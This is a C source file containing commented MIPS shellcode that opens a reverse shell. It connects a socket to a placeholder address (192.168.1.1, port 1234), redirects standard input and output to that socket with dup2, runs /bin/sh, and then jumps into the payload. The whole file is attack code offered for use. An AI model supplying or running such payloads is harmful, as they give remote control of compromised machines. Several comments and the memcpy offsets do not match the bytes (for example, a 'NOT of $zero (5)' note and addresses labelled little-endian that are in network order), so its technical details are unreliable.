#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

void main() {
    char sc[] =
        // Set $t1 to -6
        "\x24\x0d\xff\xfa"
        // Set $t1 to bitwise NOT of $zero (5)
        "\x01\xa0\x68\x27"
        // Set $a0, $a1, $a2 for socket(2, 2, 0)
        "\x25\xa4\xff\xfd"
        "\x25\xa5\xff\xfd"
        "\x25\xa6\xff\xfb"
        // Call socket(2, 2, 0) and store result in $s0
        "\x24\x02\x17\x98"
        "\x01\x01\x01\x0c"
        "\x24\x50\x10\x10"
        // Set $t2 to 0x2121
        "\x24\x0e\x21\x21"
        // Set $a0, $a1, $a2 for connect
        "\x26\x04\xef\xf0"
        "\x39\xcc\x21\x23"
        "\xa7\xac\xff\xec"
        "\x24\x0c\x5a\xc2"
        "\xa7\xac\xff\xee"
        "\x24\x0c\x5d\xb8"
        "\xa7\xac\xff\xf0"
        "\x34\x0c\xd8\x22"
        "\xa7\xac\xff\xf2"
        "\x27\xa5\xff\xec"
        "\x39\xc6\x21\x31"
        // Call connect and provide IP and port
        "\x24\x02\x17\x99"
        "\x01\x01\x01\x0c"
        // Set $t3 to 0x7f7f
        "\x24\x0f\x7f\x7f"
        // Set $a0, $a1 for dup2(sock, 0)
        "\x26\x04\xef\xf0"
        "\x25\xe5\x80\x81"
        // Call dup2(sock, 0)
        "\x24\x02\x17\x90"
        "\x01\x01\x01\x0c"
        // Set $a0, $a1 for dup2(sock, 1)
        "\x26\x04\xef\xf0"
        "\x25\xe5\x80\x82"
        // Call dup2(sock, 1)
        "\x24\x02\x17\x90"
        "\x01\x01\x01\x0c"
        // Set $a0, $a1 for dup2(sock, 2)
        "\x26\x04\xef\xf0"
        "\x25\xe5\x80\x83"
        // Call dup2(sock, 2)
        "\x24\x02\x17\x90"
        "\x01\x01\x01\x0c"
        // Set $t0 to "/bin/sh"
        "\x3c\x0c\x2f\x62"
        "\x25\x8c\x69\x6e"
        "\xaf\xac\xff\xec"
        "\x3c\x0c\x2f\x73"
        "\x25\x8c\x68\x68"
        // Store "/bin/sh" null-terminated string in $a0
        "\xaf\xac\xff\xf0"
        "\xa3\xa0\xff\xf3"
        // Set $a0, $a1, $a2 for execve
        "\x27\xa4\xff\xec"
        "\xaf\xa4\xff\xf8"
        "\xaf\xa0\xff\xfc"
        // Call execve("/bin/sh", ["/bin/sh"], 0)
        "\x27\xa5\xff\xf8"
        "\x28\x06\xff\xff"
        "\x24\x02\x17\xa9"
        "\x01\x01\x01\x0c";

    // Replace the following placeholders with the actual IP address and port
    char ip[] = "\xc0\xa8\x01\x01";  // Example: 192.168.1.1 (in little-endian)
    char port[] = "\x04\xd2";        // Example: Port 1234 (in little-endian)

    // Copy the IP address and port into the shellcode
    memcpy(&sc[55], ip, 4);
    memcpy(&sc[61], port, 2);

    // Execute the shellcode
    void (*f)() = (void *)sc;
    f();
}
